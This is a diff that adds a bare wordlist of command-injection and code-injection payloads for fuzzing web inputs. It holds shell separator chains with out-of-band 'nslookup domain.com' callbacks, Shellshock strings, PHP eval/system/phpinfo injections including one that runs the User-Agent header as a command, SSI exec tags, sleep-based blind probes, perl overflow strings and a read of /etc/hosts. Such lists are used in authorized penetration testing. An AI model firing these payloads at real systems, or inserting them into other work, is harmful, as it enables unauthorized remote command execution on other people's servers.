@@ -1,0 +1,135 @@
+"
+"'
+& 
+&& 
+'
+'"
+; 
+`
+| 
+|| 
+;{$_GET["cmd"]}
+$(nslookup domain.com)
+$(`nslookup domain.com`)
+$(`nslookup domain.com`)
+ {${phpinfo()}}
+{${phpinfo()}}
+;${@print(md5(RCEVulnerable))};
+${@print("RCEVulnerable")}
+${@print(system($_SERVER['HTTP_USER_AGENT']))}
+{${sleep(10)}}
+ {${sleep(20)}}
+{${sleep(20)}}
+ {${sleep(3)}}
+{${sleep(3)}}
+ {${sleep(hexdec(dechex(20)))}} 
+{${sleep(hexdec(dechex(20)))}} 
+%0a
+%0a%0d
+%0Anslookup domain.com
+%0a nslookup domain.com %0a
+%0Anslookup domain.com%0A
+%0A/usr/bin/nslookup domain.com
+%0A/usr/bin/nslookup domain.com%0A
+%20{${phpinfo()}}
+%20{${sleep(20)}}
+%20{${sleep(3)}}
+|nslookup domain.com||a+' |nslookup domain.com+nslookup domain.com||a #|"+|nslookup domain.com||a #
+%2 -n nslookup domain.com||`nslookup domain.com` #' |nslookup domain.com||`nslookup domain.com` #\" |nslookup domain.com
+a;nslookup domain.com;
+a;nslookup domain.com|
+a|nslookup domain.com|
+a;nslookup domain.com\n
+() { :;}; /bin/bash -c "nslookup domain.com`"
+cat /etc/hosts
+";echo shrbrk `/usr/bin/nslookup domain.com 2>&1`"
+eval('nslookup domain.com')
+eval('nslookup domain.com');
+<!--#exec cmd="nslookup domain.com"-->
+<!--#exec cmd="/usr/bin/nslookup domain.com;-->
+exec('nslookup domain.com')
+exec('nslookup domain.com');
+/index.html|nslookup domain.com|
+\n/bin/nslookup domain.com\n
+\necho INJECTX\nexit\n\033[2Anslookup domain.com\n
+\nnslookup domain.com;
+\nnslookup domain.com|
+\nnslookup domain.com\n
+& nslookup domain.com
+& nslookup domain.com 
+& nslookup domain.com &
+&& nslookup domain.com
+&& nslookup domain.com 
+&&nslookup domain.com
+() { :;}; nslookup domain.com
+*; nslookup domain.com
+; nslookup domain.com
+; nslookup domain.com 
+;nslookup domain.com
+;nslookup domain.com;
+;nslookup domain.com|
+`;nslookup domain.com;`
+`nslookup domain.com`
+| nslookup domain.com
+| nslookup domain.com 
+|| nslookup domain.com
+||nslookup domain.com||
+|nslookup domain.com
+|nslookup domain.com|
+nslookup domain.com
+nslookup domain.com 
+;nslookup domain.com\n
+nslookup domain.comn
+ nslookup domain.com ||`nslookup domain.com` #' |nslookup domain.com||`nslookup domain.com` #\" |nslookup domain.com
+nslookup domain.com ||`nslookup domain.com` #' |nslookup domain.com||`nslookup domain.com` #\" |nslookup domain.com
+\n/usr/bin/nslookup domain.com\n
+perl -e 'print "X"x1024'
+& perl -e 'print "X"x16096'
+&& perl -e 'print "X"x16096'
+; perl -e 'print "X"x16096'
+| perl -e 'print "X"x16096'
+|| perl -e 'print "X"x16096'
+perl -e 'print "X"x16384'
+& perl -e 'print "X"x2048'
+&& perl -e 'print "X"x2048'
+; perl -e 'print "X"x2048'
+perl -e 'print "X"x2048'
+& perl -e 'print "X"x4096'
+&& perl -e 'print "X"x4096'
+; perl -e 'print "X"x4096'
+| perl -e 'print "X"x4096'
+|| perl -e 'print "X"x4096'
+perl -e 'print "X"x4096'
+&& perl -e 'print "X"x8096'
+; perl -e 'print "X"x8096'
+| perl -e 'print "X"x8096'
+|| perl -e 'print "X"x8096'
+perl -e 'print "X"x8192'
+perl -e 'print "X"x81920'
+& phpinfo()
+&& phpinfo()
+';phpinfo();//
+;phpinfo()
+;phpinfo();//
+| phpinfo()
+|| phpinfo()
+phpinfo()
+phpinfo();
+:phpversion();
+\r
+\r\n
+route
+& sysinfo
+&& sysinfo
+; sysinfo
+| sysinfo
+sysinfo
+;system('nslookup%20domain.com')
+& system('nslookup domain.com');
+&& system('nslookup domain.com');
+; system('nslookup domain.com');
+| system('nslookup domain.com');
+|| system('nslookup domain.com');
+system('nslookup domain.com')
+system('nslookup domain.com');
+test*; nslookup domain.com -lhtR /var/www/
